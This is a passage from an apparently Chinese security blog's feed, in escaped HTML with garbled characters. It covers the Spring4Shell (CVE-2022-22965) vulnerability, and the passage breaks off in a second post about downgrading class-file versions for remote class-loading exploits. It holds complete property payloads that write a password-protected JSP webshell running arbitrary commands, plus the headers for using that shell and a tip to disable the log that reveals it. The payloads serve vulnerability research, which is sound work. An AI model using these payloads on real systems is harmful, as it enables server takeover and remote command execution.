punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CVE-2022-22965åœ¨Java9æ–°å¢äº†moduleä¹‹å:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;directory&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;webapps&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;ROOT
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;prefix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;shell
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;suffix&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;jsp
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fileDateFormat&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;classLoader&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;resources&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parent&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pipeline&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pattern&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc2&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;j&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;pwd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;InputStream&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;in&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bc1&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;cmd&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;int&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;new&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;byte&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;B2048&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;20String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;B&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;Bsuffix&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7D&lt;/span&gt;i&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;headers &amp;#x3D; &amp;#123;&amp;quot;suffix&amp;quot;:&amp;quot;%&amp;gt;&amp;#x2F;&amp;#x2F;&amp;quot;,
            &amp;quot;c1&amp;quot;:&amp;quot;Runtime&amp;quot;,
            &amp;quot;c2&amp;quot;:&amp;quot;&amp;lt;%&amp;quot;,
            &amp;quot;DNT&amp;quot;:&amp;quot;1&amp;quot;,
            &amp;quot;Content-Type&amp;quot;:&amp;quot;application&amp;#x2F;x-www-form-urlencoded&amp;quot;
&amp;#125;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;åˆ©ç”¨æ¡ä»¶&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨æ¡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨æ¡ä»¶&quot;&gt;&lt;/a&gt;åˆ©ç”¨æ¡ä»¶&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Javaç‰ˆæœ¬&amp;gt;=JDK9 &lt;/li&gt;
&lt;li&gt;Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)&lt;/li&gt;
&lt;li&gt;æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰&lt;/li&gt;
&lt;li&gt;æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;æ³¨æ„äº‹é¡¹&quot;&gt;&lt;a href=&quot;#æ³¨æ„äº‹é¡¹&quot; class=&quot;headerlink&quot; title=&quot;æ³¨æ„äº‹é¡¹&quot;&gt;&lt;/a&gt;æ³¨æ„äº‹é¡¹&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: &lt;code&gt;class.module.classLoader.resources.context.parent.pipeline.first.enabled=false&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;æ¼æ´åˆ†æ&lt;/h2&gt;&lt;p&gt;å½“Content-Typeæ˜¯&lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨&lt;code&gt;ServletModelAttributeMethodProcessor&lt;/code&gt;è§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:&lt;code&gt;org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)&lt;/code&gt;:&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/3.png&quot;&gt;&lt;br&gt;æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥&lt;code&gt;org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)&lt;/code&gt;å¯¹è·å–åˆ°çš„&lt;code&gt;mpvs&lt;/code&gt;è¿›è¡Œåˆæ­¥æ ¡éªŒï¼š&lt;br&gt;&lt;img src=&quot;/2022/04/06/CVE-2022-22965/4.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>ä½ç‰ˆæœ¬Javaè¿è¡Œé«˜ç‰ˆçš„Class</title>
    <link href="https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html"/>
    <id>https://jkme.github.io/2022/03/30/Load_Class_In_Multi_JavaVersion.html</id>
    <published>2022-03-29T16:00:00.000Z</published>
    <updated>2022-03-30T09:25:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-èƒŒæ™¯ä»‹ç»"><a href="#0x1-èƒŒæ™¯ä»‹ç»" class="headerlink" title="0x1. èƒŒæ™¯ä»‹ç»"></a>0x1. èƒŒæ™¯ä»‹ç»</h2><p>æ¯”å¦‚<code>fastjson</code>ã€<code>log4j</code>ä¸­éœ€è¦è¿œç¨‹åŠ è½½æ¶æ„classæ–‡ä»¶çš„æ—¶å€™ï¼Œå¦‚æœæ¶æ„Classæ–‡ä»¶çš„ç‰ˆæœ¬é«˜äºç›®æ ‡ç‰ˆæœ¬ï¼Œæ¯”å¦‚æ‰˜ç®¡åœ¨æœåŠ¡å™¨çš„Classæ˜¯1.8ç¼–è¯‘çš„ï¼Œä½†æ˜¯ç›®æ ‡ç‰ˆæœ¬æ˜¯1.7ï¼Œä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å‡ºç°ç±»ä¼¼è¿™æ ·çš„é”™è¯¯ï¼š<code>java.lang.UnsupportedClassVersionError: Unsupported major.minor version</code></p><h2 id="0x2-è§£å†³æ–¹æ³•"><a href="#0x2-è§£å†³æ–¹æ³•" class="headerlink" title="0x2. è§£å†³æ–¹æ³•"></a>0x2. è§£å†³æ–¹æ³•</h2><p>ç”¨ä½ç‰ˆæœ¬çš„Javaï¼Œæ¯”å¦‚1.6å»ç¼–è¯‘Classæ–‡ä»¶ï¼Œå°±å¯ä»¥å…¨ç‰ˆæœ¬é€šç”¨ã€‚</p><p>è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œæ‰‹åŠ¨ä¿®æ”¹Classæ–‡ä»¶ã€‚å½“Javaç‰ˆæœ¬ä¸åŒçš„æ—¶å€™ï¼Œç¼–è¯‘å‡ºæ¥çš„Classæ–‡ä»¶ä¹Ÿä¼šä¸ä¸€æ ·ï¼Œå…¶ä¸­Classæ–‡ä»¶é‡Œé¢ä¼šå¸¦ä¸Šç¼–è¯‘çš„Javaç‰ˆæœ¬å·ï¼š<br><img src="/2022/03/30/Load_Class_In_Multi_JavaVersion/1.png"></p><ul><li>45 = Java 1.1</li><li>46 = Java 1.2</li><li>47 = Java 1.3</li><li>48 = Java 1.4</li><li>49 = Java 5</li><li>50 = Java 6</li><li>51 = Java 7</li><li>52 = Java 8</li><li>53 = Java 9</li><li>54 = Java 10</li><li>55 = Java 11</li><li>56 = Java 12</li><li>57 = Java 13</li><li>58 = Java 14</li><li>59 = Java 15</li></ul><p>æ‰€ä»¥ï¼Œå°è¯•æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬å·è¯•è¯•ï¼Ÿ</p><ol><li>åˆ‡æ¢åˆ°<code>java</code>çš„15ç‰ˆæœ¬ï¼Œç¼–è¯‘è¿è¡Œæ­£å¸¸</li><li>ä½¿ç”¨<code>vim -b 